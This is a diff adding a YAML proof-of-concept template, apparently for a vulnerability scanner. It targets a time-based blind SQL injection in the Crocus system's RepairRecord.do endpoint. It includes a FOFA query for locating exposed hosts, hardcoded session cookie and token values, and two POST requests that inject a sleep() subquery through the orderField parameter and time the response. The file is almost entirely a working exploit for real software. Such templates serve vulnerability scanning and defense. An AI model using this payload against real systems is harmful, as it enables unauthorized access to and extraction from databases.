@@ -1,0 +1,35 @@
+id: poc-yaml-crocus-repairrecord-sqli
+info:
+  name: 锐明技术Crocus系统 RepairRecord.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: Crocus系统
+  fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 2
+  t3: random_int(1,4)
+  t4: t3 + 2
+requests:
+- method: POST
+  path: /RepairRecord.do?Action=QueryLast
+  headers:
+    Content-Type: application/x-www-form-urlencoded;
+    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
+    Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
+  data: EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep({{.t1}}))a)&orderType=asc
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Code\\\":200\") &&\ncontains(body,\"\
+    \\\"Result\\\":\") &&\ncontains(body,\"\\\"Count\\\":0\") &&\nduration >= t1 &&\n\
+    duration <= t2\n"
+- method: POST
+  path: /RepairRecord.do?Action=QueryLast
+  headers:
+    Content-Type: application/x-www-form-urlencoded;
+    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
+    Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
+  data: EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep({{.t3}}))a)&orderType=asc
+  expression: "status_code == 200 && \ncontains(body,\"\\\"Code\\\":200\") &&\ncontains(body,\"\
+    \\\"Result\\\":\") &&\ncontains(body,\"\\\"Count\\\":0\") &&\nduration >= t3 &&\n\
+    duration <= t4\n"
+transport: http
